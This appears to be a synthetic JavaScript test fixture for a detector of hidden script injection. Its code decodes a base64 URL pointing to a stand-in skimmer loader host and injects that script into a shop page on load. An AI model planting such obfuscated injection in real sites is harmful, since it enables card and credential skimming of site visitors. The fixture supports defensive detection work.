// Synthetic test fixture: not functional malware. Hosts use the reserved .test TLD.
// context: script_host=cdn.vendor.test site=shop.example.test
// expect: inject.hidden_source=high obfuscation.packed=medium
(function (d) {
  var s = d.createElement("script");
  s.async = true;
  s.src = atob("aHR0cHM6Ly9sb2FkZXIuc2tpbS50ZXN0L2EuanM=");
  d.head.appendChild(s);
})(document);
